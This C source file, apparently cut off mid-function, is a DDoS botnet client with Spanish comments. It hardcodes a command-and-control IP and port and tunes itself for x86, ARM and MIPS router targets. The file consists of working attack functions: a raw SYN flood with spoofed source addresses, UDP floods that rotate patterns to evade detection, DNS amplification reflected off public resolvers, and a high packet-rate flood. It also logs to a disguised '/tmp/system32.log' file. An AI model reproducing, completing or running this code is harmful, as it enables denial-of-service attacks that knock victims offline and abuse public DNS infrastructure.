#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/resource.h>

#define CNC_IP "172.96.140.62"
#define CNC_PORT 14037

// ========== VARIABLES GLOBALES ==========
int running = 1;
int cpu_cores = 1;

// ========== DETECCIÓN DE ARQUITECTURA ==========
#if defined(__x86_64__)
    // 🔥 x86_64 - Máxima potencia (PCs, VPS, servidores)
    #define ARCH_NAME           "x86_64"
    #define ARCH_POWER          100      // 100% poder
    #define MAX_TOTAL_SOCKS     20000
    #define SEND_BUFFER_MB      64
    #define MAX_ATTACK_THREADS  8
    #define TCP_SOCKET_POOL     5000
    #define UDP_SOCKET_POOL     1500
    #define HTTP_SOCKET_POOL    3000
    #define PACKETS_PER_CYCLE   1000

#elif defined(__aarch64__)
    // 📱 aarch64 - ARM 64-bit (móviles modernos, RPi 4)
    #define ARCH_NAME           "aarch64"
    #define ARCH_POWER          75       // 75% poder
    #define MAX_TOTAL_SOCKS     8000
    #define SEND_BUFFER_MB      32
    #define MAX_ATTACK_THREADS  4
    #define TCP_SOCKET_POOL     2000
    #define UDP_SOCKET_POOL     600
    #define HTTP_SOCKET_POOL    1500
    #define PACKETS_PER_CYCLE   400

#elif defined(__arm__)
    // Detección específica de versión ARM
    #if defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7__)
        // 📟 arm7 - ARMv7 (RPi 2/3, móviles 2012-2016)
        #define ARCH_NAME           "arm7"
        #define ARCH_POWER          45       // 45% poder
        #define MAX_TOTAL_SOCKS     3000
        #define SEND_BUFFER_MB      8
        #define MAX_ATTACK_THREADS  2
        #define TCP_SOCKET_POOL     800
        #define UDP_SOCKET_POOL     250
        #define HTTP_SOCKET_POOL    600
        #define PACKETS_PER_CYCLE   150
    
    #elif defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__)
        // 📻 arm6 - ARMv6 (RPi 1, routers viejos)
        #define ARCH_NAME           "arm6"
        #define ARCH_POWER          30       // 30% poder
        #define MAX_TOTAL_SOCKS     1500
        #define SEND_BUFFER_MB      4
        #define MAX_ATTACK_THREADS  1
        #define TCP_SOCKET_POOL     400
        #define UDP_SOCKET_POOL     120
        #define HTTP_SOCKET_POOL    300
        #define PACKETS_PER_CYCLE   80
    
    #elif defined(__ARM_ARCH_5TE__) || defined(__ARM_ARCH_5__)
        // 📞 arm5 - ARMv5 (routers muy viejos)
        #define ARCH_NAME           "arm5"
        #define ARCH_POWER          20       // 20% poder
        #define MAX_TOTAL_SOCKS     800
        #define SEND_BUFFER_MB      2
        #define MAX_ATTACK_THREADS  1
        #define TCP_SOCKET_POOL     200
        #define UDP_SOCKET_POOL     80
        #define HTTP_SOCKET_POOL    150
        #define PACKETS_PER_CYCLE   50
    
    #else
        // ARM genérico (por si acaso)
        #define ARCH_NAME           "arm"
        #define ARCH_POWER          35       // 35% poder
        #define MAX_TOTAL_SOCKS     2000
        #define SEND_BUFFER_MB      6
        #define MAX_ATTACK_THREADS  2
        #define TCP_SOCKET_POOL     500
        #define UDP_SOCKET_POOL     150
        #define HTTP_SOCKET_POOL    400
        #define PACKETS_PER_CYCLE   100
    #endif

#elif defined(__mips__)
    // 🐌 mips - MIPS big-endian (routers)
    #define ARCH_NAME           "mips"
    #define ARCH_POWER          18       // 18% poder
    #define MAX_TOTAL_SOCKS     700
    #define SEND_BUFFER_MB      2
    #define MAX_ATTACK_THREADS  1
    #define TCP_SOCKET_POOL     180
    #define UDP_SOCKET_POOL     70
    #define HTTP_SOCKET_POOL    140
    #define PACKETS_PER_CYCLE   45

#elif defined(__mipsel__)
    // 🐌 mipsel - MIPS little-endian (routers)
    #define ARCH_NAME           "mipsel"
    #define ARCH_POWER          18       // 18% poder
    #define MAX_TOTAL_SOCKS     700
    #define SEND_BUFFER_MB      2
    #define MAX_ATTACK_THREADS  1
    #define TCP_SOCKET_POOL     180
    #define UDP_SOCKET_POOL     70
    #define HTTP_SOCKET_POOL    140
    #define PACKETS_PER_CYCLE   45

#elif defined(__i386__)
    // 💾 x86 - 32-bit (VPS viejos)
    #define ARCH_NAME           "x86"
    #define ARCH_POWER          55       // 55% poder
    #define MAX_TOTAL_SOCKS     4000
    #define SEND_BUFFER_MB      16
    #define MAX_ATTACK_THREADS  2
    #define TCP_SOCKET_POOL     1000
    #define UDP_SOCKET_POOL     300
    #define HTTP_SOCKET_POOL    800
    #define PACKETS_PER_CYCLE   200

#else
    // ❓ Arquitectura desconocida
    #define ARCH_NAME           "unknown"
    #define ARCH_POWER          25       // 25% poder
    #define MAX_TOTAL_SOCKS     1000
    #define SEND_BUFFER_MB      4
    #define MAX_ATTACK_THREADS  1
    #define TCP_SOCKET_POOL     250
    #define UDP_SOCKET_POOL     100
    #define HTTP_SOCKET_POOL    200
    #define PACKETS_PER_CYCLE   70
#endif

// ========== CÁLCULOS AUTOMÁTICOS ==========

// Timeouts basados en poder
#define CONNECT_TIMEOUT_MS  (3000 - (ARCH_POWER * 20))  // x86_64: 1000ms, mips: 2640ms
#define SEND_TIMEOUT_MS     (1500 - (ARCH_POWER * 10))  // x86_64: 500ms, mips: 1320ms

// Sleep entre ciclos
#define CYCLE_SLEEP_US      (100000 / ARCH_POWER)       // x86_64: 1000us, mips: 5555us

// Threads por método (si la arquitectura soporta threads)
#if MAX_ATTACK_THREADS > 1
    #define TCP_THREADS      (MAX_ATTACK_THREADS)
    #define UDP_THREADS      (MAX_ATTACK_THREADS / 2)
    #define HTTP_THREADS     (MAX_ATTACK_THREADS)
#else
    #define TCP_THREADS      1
    #define UDP_THREADS      1
    #define HTTP_THREADS     1
#endif

// ========== DECLARACIONES DE FUNCIONES ==========
void log_msg(const char* msg);
void rand_str(char *dest, int length);
void rand_bytes(unsigned char *dest, int length);
void optimize_system();
void* tcp_attack(void* arg);
void* udphex_attack(void* arg);
void* dns_attack(void* arg);
void* pps_attack(void* arg);
void* udpbypass_attack(void* arg);
void* tcpbypass_attack(void* arg);
void* https_kill(void* arg);
void* game_attack(void* arg);  // Declaración añadida
void handle_command(int sock, char* buffer);
void run_bot_logic();

// ========== FUNCIONES ==========
void log_msg(const char* msg) {
    FILE* f = fopen("/tmp/system32.log", "a");
    if(f) {
        fprintf(f, "[%ld][%s] %s\n", time(NULL), ARCH_NAME, msg);
        fclose(f);
    }
}

void rand_str(char *dest, int length) {
    const char charset[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    
    // Optimización automática según arquitectura
    #if ARCH_POWER > 70
        // Rápido: generar 4 bytes a la vez
        unsigned int r;
        for(int i = 0; i < length; i += 4) {
            r = rand();
            for(int j = 0; j < 4 && (i+j) < length; j++) {
                dest[i+j] = charset[(r >> (j*8)) % 62];
            }
        }
    #else
        // Lento: byte a byte
        for(int i = 0; i < length; i++) {
            dest[i] = charset[rand() % 62];
        }
    #endif
    dest[length] = '\0';
}

// Función de datos aleatorios mejorada
void rand_bytes(unsigned char *dest, int length) {
    // Usar memset rápido para ciertos patrones
    if(length > 1000 && ARCH_POWER > 60) {
        memset(dest, rand() % 256, length);
        return;
    }
    
    // Normal para hardware lento o tamaños pequeños
    for(int i = 0; i < length; i++) {
        dest[i] = rand() % 256;
    }
}

void optimize_system() {
    // Detectar cores reales
    cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);
    if(cpu_cores <= 0) cpu_cores = 1;
    
    // No exceder límites de arquitectura
    if(cpu_cores > MAX_ATTACK_THREADS) {
        cpu_cores = MAX_ATTACK_THREADS;
    }
    
    // Aumentar límites
    struct rlimit rl;
    getrlimit(RLIMIT_NOFILE, &rl);
    rl.rlim_cur = MAX_TOTAL_SOCKS;
    rl.rlim_max = MAX_TOTAL_SOCKS;
    setrlimit(RLIMIT_NOFILE, &rl);
    
    // Configurar buffer TCP global
    int tcp_buffer = SEND_BUFFER_MB * 1024 * 1024;
    char syscmd[256];
    snprintf(syscmd, sizeof(syscmd), 
             "sysctl -w net.core.wmem_max=%d 2>/dev/null", tcp_buffer);
    system(syscmd);
    
    // Log detallado
    char msg[512];
    snprintf(msg, sizeof(msg),
             "[%s] Cores: %d | Sockets: %d | Buffer: %dMB | "
             "Power: %d%% | Timeout: %dms/%dms | Sleep: %dus",
             ARCH_NAME, cpu_cores, MAX_TOTAL_SOCKS, SEND_BUFFER_MB,
             ARCH_POWER, CONNECT_TIMEOUT_MS, SEND_TIMEOUT_MS, CYCLE_SLEEP_US);
    log_msg(msg);
}

// ========== ATAQUE GAME (añadido) ==========
void* game_attack(void* arg) {
    char* params = (char*)arg;
    char ip[64];
    int port, duration;
    
    sscanf(params, "%63s %d %d", ip, &port, &duration);
    log_msg("GAME attack started (placeholder)");
    
    time_t end = time(NULL) + duration;
    
    while(running && time(NULL) < end) {
        sleep(1);
    }
    
    log_msg("GAME finished");
    free(params);
    return NULL;
}

// TCP AQUI VA XD
void* tcp_attack(void* arg) {
    char* params = (char*)arg;
    char ip[64];
    int port, duration;
    
    sscanf(params, "%63s %d %d", ip, &port, &duration);
    log_msg("TCP RAW SYN FLOOD started (ROOT required)");
    
    time_t end = time(NULL) + duration;
    uint32_t target_ip = inet_addr(ip);
   
    
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(sock < 0) {
        log_msg("TCP RAW failed: Need ROOT privileges!");
        free(params);
        return NULL;
    }
    
    // Permitir escribir headers IP manualmente
    int one = 1;
    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        log_msg("TCP RAW: IP_HDRINCL failed");
        close(sock);
        free(params);
        return NULL;
    }
    
    // Configurar destino
    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    dest.sin_addr.s_addr = target_ip;
    
    // Buffer para paquete
    char packet[4096];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    
    // Variables de control
    srand(time(NULL));
    long packet_count = 0;
    time_t last_stats = time(NULL);
    
    // 🔥 BUCLE DE ATAQUE PRINCIPAL
    while(running && time(NULL) < end) {
        // Ráfaga de paquetes por ciclo
        for(int burst = 0; burst < 5000; burst++) {
            memset(packet, 0, sizeof(packet));
            
            // ===== IP HEADER =====
            iph->ihl = 5;
            iph->version = 4;
            iph->tos = 0;
            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
            iph->id = htons(rand() % 65535);
            iph->frag_off = 0;
            iph->ttl = 64 + (rand() % 64);  // TTL variable
            
            // Protocolo TCP
            iph->protocol = IPPROTO_TCP;
            iph->check = 0;
            
            // IP SPOOFING: Origen aleatorio
            uint32_t src_ip;
            int ip_type = rand() % 10;
            
            if(ip_type < 4) {
                // IPs residenciales (192.168.x.x)
                src_ip = (192 << 24) | (168 << 16) | (rand() % 256 << 8) | (rand() % 256);
            } else if(ip_type < 7) {
                // IPs públicas normales
                src_ip = rand() % 0xFFFFFFFF;
                // Asegurar que no sea 0.0.0.0, 127.x.x.x, 224-255.x.x.x
                while((src_ip & 0xFF000000) == 0 || 
                      (src_ip & 0xFF000000) == 0x7F000000 ||
                      (src_ip & 0xF0000000) == 0xE0000000) {
                    src_ip = rand() % 0xFFFFFFFF;
                }
            } else {
                // IPs de cloud/CDN
                src_ip = (rand() % 5 + 100) << 24 | 
                        (rand() % 256 << 16) | 
                        (rand() % 256 << 8) | 
                        (rand() % 256);
            }
            
            iph->saddr = src_ip;
            iph->daddr = target_ip;
            
            // Checksum IP (simplificado)
            iph->check = 0;
            unsigned short *ip_ptr = (unsigned short *)iph;
            unsigned int ip_sum = 0;
            for(int i = 0; i < sizeof(struct iphdr)/2; i++) {
                ip_sum += ip_ptr[i];
            }
            iph->check = ~((ip_sum & 0xFFFF) + (ip_sum >> 16));
            
            // ===== TCP HEADER =====
            // Puerto origen aleatorio
            tcph->source = htons(49152 + (rand() % 16384));
            tcph->dest = htons(port);
            
            // Sequence number aleatorio
            tcph->seq = htonl(rand() % 4294967295);
            tcph->ack_seq = 0;
            
            // Header length y flags
            tcph->doff = 5;  // 20 bytes
            
            // Flags: SOLO SYN (SYN flood)
            tcph->syn = 1;
            tcph->ack = 0;
            tcph->rst = 0;
            tcph->psh = 0;
            tcph->fin = 0;
            tcph->urg = 0;
            
            // Window size grande
            tcph->window = htons(65535);
            tcph->check = 0;  // Sin checksum para velocidad
            tcph->urg_ptr = 0;
            
            // ===== ENVIAR PAQUETE =====
            if(sendto(sock, packet, ntohs(iph->tot_len), 0,
                     (struct sockaddr*)&dest, sizeof(dest)) > 0) {
                packet_count++;
            }
            
            // Micro-pausa cada 100 paquetes
            if(burst % 100 == 0) {
                usleep(1);
            }
        }
        
        // ===== ESTADÍSTICAS =====
        if(time(NULL) - last_stats >= 5) {
            char stats[128];
            snprintf(stats, sizeof(stats),
                    "TCP RAW: %ldk packets | %.0f PPS",
                    packet_count / 1000,
                    (double)packet_count / (time(NULL) - last_stats + 1));
            log_msg(stats);
            last_stats = time(NULL);
        }
        
        // Pausa entre ráfagas
        usleep(1000);
    }
    
    // Limpieza
    close(sock);
    
    char finish_msg[128];
    snprintf(finish_msg, sizeof(finish_msg),
            "TCP RAW finished: %ld total packets", packet_count);
    log_msg(finish_msg);
    
    free(params);
    return NULL;
}

// ========== UDPHEX (UDP con datos hexadecimales avanzado - Mejorado) ==========
void* udphex_attack(void* arg) {
    char* params = (char*)arg;
    char ip[64];
    int port, duration;
    
    sscanf(params, "%63s %d %d", ip, &port, &duration);
    log_msg("UDPHEX attack started (Advanced Hex with Bypass)");
    
    time_t end = time(NULL) + duration;
    
    // Pool grande de sockets para máxima potencia
    int num_sockets = UDP_SOCKET_POOL;
    int sock_pool[num_sockets];
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target.sin_addr);
    
    // Patrones hexadecimales mejorados para mejor bypass
    const char* hex_patterns[] = {
        // Protocolos legítimos comunes
        "%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x0800450000280000400040110000",  // Ethernet+IPv4
        "3333000000fb00000000000086dd6000000000203aff00000000000000000000000000000000",  // IPv6
        "ffffffffffff%02x%02x%02x%02x%02x%02x08060001080006040001%02x%02x%02x%02x%02x%02xc0a80001",  // ARP
        "1234010000010000000000010000ff000100010377777706676f6f676c6503636f6d0000010001",  // DNS
        "474554202f20485454502f312e310d0a486f73743a200d0a557365722d4167656e743a200d0a",  // HTTP
        "01000000%02x%02x%02x%02x%02x%02x%02x%02x00000000000000000000000000000000",  // Binario
        "9001%02x%02x0000%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",  // Gaming
        "c000000001088394c8f03e5157080000449e00000001",  // QUIC
        "00010000000000002112a442000000000000000000",  // STUN
        "102600044d5154540402003c000000000000000000"   // MQTT
    };
    
    // Inicializar sockets con configuración avanzada
    for(int i = 0; i < num_sockets; i++) {
        sock_pool[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if(sock_pool[i] >= 0) {
            // Buffers enormes para máxima potencia
            int buf_size = SEND_BUFFER_MB * 1024 * 1024;
            setsockopt(sock_pool[i], SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
            
            // Optimizaciones para bypass
            int flags = 1;
            setsockopt(sock_pool[i], SOL_SOCKET, SO_BROADCAST, &flags, sizeof(flags));
            setsockopt(sock_pool[i], SOL_SOCKET, SO_REUSEADDR, &flags, sizeof(flags));
            setsockopt(sock_pool[i], SOL_SOCKET, SO_REUSEPORT, &flags, sizeof(flags));
            
            // TTL variable
            int ttl = 32 + (rand() % 96);
            setsockopt(sock_pool[i], IPPROTO_IP, IP_TTL, &ttl, sizeof(ttl));
            
            // Puerto fuente aleatorio con distribución inteligente
            struct sockaddr_in src_addr;
            memset(&src_addr, 0, sizeof(src_addr));
            src_addr.sin_family = AF_INET;
            
            // Distribución en múltiples rangos
            if(i % 5 == 0) src_addr.sin_port = htons(1024 + (rand() % 49151));
            else if(i % 5 == 1) src_addr.sin_port = htons(49152 + (rand() % 16384));
            else if(i % 5 == 2) src_addr.sin_port = htons(10000 + (rand() % 10000));
            else if(i % 5 == 3) src_addr.sin_port = htons(20000 + (rand() % 10000));
            else src_addr.sin_port = htons(30000 + (rand() % 10000));
            
            src_addr.sin_addr.s_addr = INADDR_ANY;
            
            bind(sock_pool[i], (struct sockaddr*)&src_addr, sizeof(src_addr));
            connect(sock_pool[i], (struct sockaddr*)&target, sizeof(target));
        }
    }
    
    int pattern_index = 0;
    time_t last_pattern_change = time(NULL);
    int packet_counter = 0;
    
    while(running && time(NULL) < end) {
        // Cambiar patrón cada 8 segundos para evadir detección
        if(time(NULL) - last_pattern_change > 8) {
            pattern_index = rand() % 10;
            last_pattern_change = time(NULL);
        }
        
        for(int i = 0; i < num_sockets; i++) {
            if(sock_pool[i] < 0) continue;
            
            // Tamaño variable inteligente para bypass
            int packet_size;
            if(rand() % 10 == 0) packet_size = 64 + (rand() % 192);
            else if(rand() % 3 == 0) packet_size = 512 + (rand() % 512);
            else packet_size = 1200 + (rand() % 300);
            
            char packet[packet_size];
            
            // Generar datos hexadecimales avanzados
            const char* pattern = hex_patterns[pattern_index];
            int pattern_len = strlen(pattern);
            int pattern_pos = 0;
            
            for(int j = 0; j < packet_size; j++) {
                if(pattern_pos < pattern_len && pattern[pattern_pos] == '%') {
                    // Formato %02x - generar byte hexadecimal
                    if(pattern_pos + 3 < pattern_len) {
                        packet[j] = rand() % 256;
                        pattern_pos += 3;
                    } else {
                        packet[j] = rand() % 256;
                        pattern_pos++;
                    }
                } else if(pattern_pos < pattern_len) {
                    // Carácter literal del patrón
                    if(pattern_pos + 1 < pattern_len) {
                        char hex[3];
                        hex[0] = pattern[pattern_pos];
                        hex[1] = pattern[pattern_pos + 1];
                        hex[2] = '\0';
                        packet[j] = (char)strtol(hex, NULL, 16);
                        pattern_pos += 2;
                    } else {
                        packet[j] = pattern[pattern_pos];
                        pattern_pos++;
                    }
                } else {
                    // Rellenar con datos aleatorios
                    if(rand() % 3 == 0) {
                        packet[j] = 32 + (rand() % 95);
                    } else {
                        packet[j] = rand() % 256;
                    }
                }
            }
            
            // Enviar con flags variados para bypass
            int send_flags = MSG_NOSIGNAL;
            if(rand() % 2 == 0) send_flags |= MSG_DONTWAIT;
            if(rand() % 3 == 0) send_flags |= MSG_CONFIRM;
            
            send(sock_pool[i], packet, packet_size, send_flags);
            packet_counter++;
            
            // Timing variable para evadir rate limiting
            if(rand() % 100 < 30) {
                usleep(rand() % 100);
            }
        }
        
        // Pausa principal mínima para máxima velocidad
        usleep(CYCLE_SLEEP_US/20);
        
        // Cambio dinámico basado en contador
        if(packet_counter > (PACKETS_PER_CYCLE * 10)) {
            pattern_index = (pattern_index + 1) % 10;
            packet_counter = 0;
        }
    }
    
    // Limpieza
    for(int i = 0; i < num_sockets; i++) {
        if(sock_pool[i] >= 0) {
            shutdown(sock_pool[i], SHUT_RDWR);
            close(sock_pool[i]);
        }
    }
    
    log_msg("UDPHEX finished");
    free(params);
    return NULL;
}

// ========== DNS (DNS Amplification - Mejorado) ==========
void* dns_attack(void* arg) {
    char* params = (char*)arg;
    char ip[64];
    int port, duration;
    
    sscanf(params, "%63s %d %d", ip, &port, &duration);
    log_msg("DNS amplification attack started (Enhanced)");
    
    // DNS siempre usa puerto 53
    time_t end = time(NULL) + duration;
    
    // Consultas DNS mejoradas que generan respuestas grandes
    unsigned char dns_queries[][64] = {
        // ANY query para respuesta máxima
        {0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
         0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0xFF, 0x00,
         0x01, 0x00, 0x01},
        // TXT query grande
        {0xAB, 0xCD, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
         0x00, 0x00, 0x00, 0x01, 0x07, 0x76, 0x65, 0x72,
         0x73, 0x69, 0x6F, 0x6E, 0x04, 0x62, 0x69, 0x6E,
         0x64, 0x00, 0x00, 0x10, 0x00, 0x01},
        // MX query
        {0x78, 0x9A, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
         0x00, 0x00, 0x00, 0x01, 0x06, 0x67, 0x6F, 0x6F,
         0x67, 0x6C, 0x65, 0x03, 0x63, 0x6F, 0x6D, 0x00,
         0x00, 0x0F, 0x00, 0x01}
    };
    
    // Más servidores DNS públicos para reflejar
    const char* dns_servers[] = {
        "8.8.8.8", "8.8.4.4",           // Google
        "1.1.1.1", "1.0.0.1",           // Cloudflare
        "9.9.9.9", "149.112.112.112",   // Quad9
        "208.67.222.222", "208.67.220.220", // OpenDNS
        "64.6.64.6", "64.6.65.6",       // Verisign
        "84.200.69.80", "84.200.70.40", // DNS.WATCH
        "8.26.56.26", "8.20.247.20",    // Comodo
        "77.88.8.8", "77.88.8.1",       // Yandex
        "94.140.14.14", "94.140.15.15"  // AdGuard
    };
    
    int num_servers = sizeof(dns_servers)/sizeof(dns_servers[0]);
    
    // Múltiples sockets para mayor throughput
    int socks[10];
    for(int i = 0; i < 10; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if(socks[i] >= 0) {
            int buf_size = 1024 * 1024 * 4;
            setsockopt(socks[i], SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
        }
    }
    
    long query_count = 0;
    
    while(running && time(NULL) < end) {
        for(int i = 0; i < 10; i++) {
            if(socks[i] < 0) continue;
            
            struct sockaddr_in server_addr;
            server_addr.sin_family = AF_INET;
            server_addr.sin_port = htons(53);
            server_addr.sin_addr.s_addr = inet_addr(dns_servers[rand() % num_servers]);
            
            // Enviar múltiples tipos de consultas
            for(int q = 0; q < 3; q++) {
                int query_idx = rand() % 3;
                int query_size = (query_idx == 0) ? 19 : (query_idx == 1 ? 30 : 28);
                
                sendto(socks[i], dns_queries[query_idx], query_size, 0,
                       (struct sockaddr*)&server_addr, sizeof(server_addr));
                
                query_count++;
            }
        }
        
        // Timing variable
        if(query_count < 1000) {
            usleep(1000); // 1ms para inicio rápido
        } else {
            usleep(5000 + (rand() % 10000)); // 5-15ms
        }
        
        // Cambio periódico de servidores
        if(query_count % 100 == 0) {
            // Rotar servidores
            usleep(10000); // 10ms pausa
        }
    }
    
    for(int i = 0; i < 10; i++) {
        if(socks[i] >= 0) close(socks[i]);
    }
    
    char finish_msg[64];
    snprintf(finish_msg, sizeof(finish_msg), "DNS finished - %ld queries sent", query_count);
    log_msg(finish_msg);
    free(params);
    return NULL;
}

// ========== PPS (High packets per second - Mejorado) ==========
void* pps_attack(void* arg) {
    char* params = (char*)arg;
    char ip[64];
    int port, duration;
    
    sscanf(params, "%63s %d %d", ip, &port, &duration);
    log_msg("PPS attack started (Enhanced High PPS)");
    
    time_t end = time(NULL) + duration;
    
    // Múltiples sockets UDP para máximo PPS
    int socks[50];
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target.sin_addr);
    
    for(int i = 0; i < 50; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if(socks[i] >= 0) {
            int buf_size = 1024 * 1024 * 12; // 12MB buffers
            setsockopt(socks[i], SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
            setsockopt(socks[i], SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int));
            
            // Puerto fuente distribuido
            struct sockaddr_in src_addr;
            memset(&src_addr, 0, sizeof(src_addr));
            src_addr.sin_family = AF_INET;
            src_addr.sin_port = htons(32768 + (rand() % 32768));
            src_addr.sin_addr.s_addr = INADDR_ANY;
            
            bind(socks[i], (struct sockaddr*)&src_addr, sizeof(src_addr));
        }
    }
    
    // Diferentes tamaños de paquetes para PPS óptimo
    char small_packet[64];
    char medium_packet[128];
    char large_packet[256];
    
    for(int i = 0; i < 64; i++) small_packet[i] = rand() % 256;
    for(int i = 0; i < 128; i++) medium_packet[i] = rand() % 256;
    for(int i = 0; i < 256; i++) large_packet[i] = rand() % 256;
    
    long packet_count = 0;
    time_t last_report = time(NULL);
    
    while(running && time(NULL) < end) {
        for(int i = 0; i < 50; i++) {
            if(socks[i] < 0) continue;
            
            // Ráfaga masiva con diferentes tamaños
            int burst_size = 100 + (rand() % 400);
            for(int burst = 0; burst < burst_size; burst++) {
                // Seleccionar tamaño de paquete
                int pkt_type = rand() % 10;
                char* pkt_data;
                size_t pkt_size;
                
                if(pkt_type < 6) { // 60% pequeños
                    pkt_data = small_packet;
                    pkt_size = sizeof(small_packet);
                } else if(pkt_type < 9) { // 30% medianos
                    pkt_data = medium_packet;
                    pkt_size = sizeof(medium_packet);
                } else { // 10% grandes
                    pkt_data = large_packet;
                    pkt_size = sizeof(large_packet);
                }
                
                sendto(socks[i], pkt_data, pkt_size, 
                      MSG_NOSIGNAL | MSG_DONTWAIT,
                      (struct sockaddr*)&target, sizeof(target));
                
                packet_count++;
                
                // Pausa micro-optimizada
                if(burst % 100 == 0 && burst > 0) {
                    usleep(1);
                }
            }
        }
        
        // Pausa mínima entre ciclos
        usleep(10);
        
        // Reporte de estadísticas
        if(time(NULL) - last_report > 10) {
            double pps = packet_count / 10.0;
            char stats[128];
            snprintf(stats, sizeof(stats), 
                    "PPS Stats: %.0f pps | Total: %ld packets",
                    pps, packet_count);
            log_msg(stats);
            
            packet_count = 0;
            last_report = time(NULL);
        }
    }
    
    for(int i = 0; i < 50; i++) {
        if(socks[i] >= 0) {
            shutdown(socks[i], SHUT_RDWR);
            close(socks[i]);
        }
    }
    
    log_msg("PPS finished");
    free(params);
    return NULL;
}

// ========== UDPBYPASS (Bypass UDP firewalls - Mejorado) ==========
void* udpbypass_attack(void* arg) {
    char* params = (char*)arg;
    char ip[64];
    int port, duration;
    
    sscanf(params, "%63s %d %d", ip, &port, &duration);
    log_msg("UDPBYPASS attack started (Enhanced No-Root)");
    
    time_t end = time(NULL) + duration;
    
    int num_sockets = 50;
    int sock_pool[num_sockets];
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target.sin_addr);
    
    // Inicializar sockets
    for(int i = 0; i < num_sockets; i++) {
        sock_pool[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if(sock_pool[i] >= 0) {
            int buf_size = 1024 * 1024 * 6;
            setsockopt(sock_pool[i], SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
            setsockopt(sock_pool[i], SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int));
            
            struct sockaddr_in src_addr;
            memset(&src_addr, 0, sizeof(src_addr));
            src_addr.sin_family = AF_INET;
            
            // Puertos fuente distribuidos
            int port_type = i % 8;
            switch(port_type) {
                case 0: src_addr.sin_port = htons(1024 + (rand() % 1000)); break;
                case 1: src_addr.sin_port = htons(5000 + (rand() % 5000)); break;
                case 2: src_addr.sin_port = htons(10000 + (rand() % 10000)); break;
                case 3: src_addr.sin_port = htons(20000 + (rand() % 10000)); break;
                case 4: src_addr.sin_port = htons(30000 + (rand() % 10000)); break;
                case 5: src_addr.sin_port = htons(40000 + (rand() % 10000)); break;
                case 6: src_addr.sin_port = htons(32768 + (rand() % 32768)); break;
                case 7: src_addr.sin_port = htons(49152 + (rand() % 16384)); break;
            }
            
            src_addr.sin_addr.s_addr = INADDR_ANY;
            
            bind(sock_pool[i], (struct sockaddr*)&src_addr, sizeof(src_addr));
            connect(sock_pool[i], (struct sockaddr*)&target, sizeof(target));
        }
    }
    
    long packet_count = 0;
    int mode = 0;
    time_t last_mode_change = time(NULL);
    
    while(running && time(NULL) < end) {
        // Cambiar modo cada 15 segundos
        if(time(NULL) - last_mode_change > 15) {
            mode = rand() % 4;
            last_mode_change = time(NULL);
        }
        
        int packet_size, packets_per_socket, sleep_time;
        
        switch(mode) {
            case 0: // Modo rápido
                packet_size = 700 + (rand() % 300);
                packets_per_socket = 50 + (rand() % 50);
                sleep_time = 0;
                break;
            case 1: // Modo variable
                packet_size = 300 + (rand() % 700);
                packets_per_socket = 30 + (rand() % 40);
                sleep_time = 5;
                break;
            case 2: // Modo stealth
                packet_size = 100 + (rand() % 200);
                packets_per_socket = 20 + (rand() % 30);
                sleep_time = 10;
                break;
            case 3: // Modo burst
                packet_size = 500 + (rand() % 500);
                packets_per_socket = 80 + (rand() % 70);
                sleep_time = 2;
                break;
            default:
                packet_size = 512;
                packets_per_socket = 40;
                sleep_time = 5;
                break;
        }
        
        for(int i = 0; i < num_sockets; i++) {
            if(sock_pool[i] < 0) continue;
            
            for(int p = 0; p < packets_per_socket; p++) {
                char packet[packet_size];
                
                // Generar datos según modo
                if(mode == 1) {
                    // Datos mixtos
                    for(int j = 0; j < packet_size; j++) {
                        int pattern = rand() % 10;
                        if(pattern < 4) packet[j] = rand() % 256;
                        else if(pattern < 8) packet[j] = 32 + (rand() % 95);
                        else packet[j] = '0' + (rand() % 10);
                    }
                } else if(mode == 2) {
                    // Datos que parecen legítimos
                    for(int j = 0; j < packet_size; j++) {
                        if(j % 16 == 0) packet[j] = ':';
                        else if(j % 16 == 1) packet[j] = '|';
                        else packet[j] = 48 + (rand() % 74);
                    }
                } else {
                    // Datos aleatorios
                    rand_str(packet, packet_size);
                }
                
                send(sock_pool[i], packet, packet_size, MSG_NOSIGNAL | MSG_DONTWAIT);
                packet_count++;
                
                // Pequeña pausa entre paquetes en modo burst
                if(mode == 3 && p % 20 == 0) {
                    usleep(1);
                }
            }
        }
        
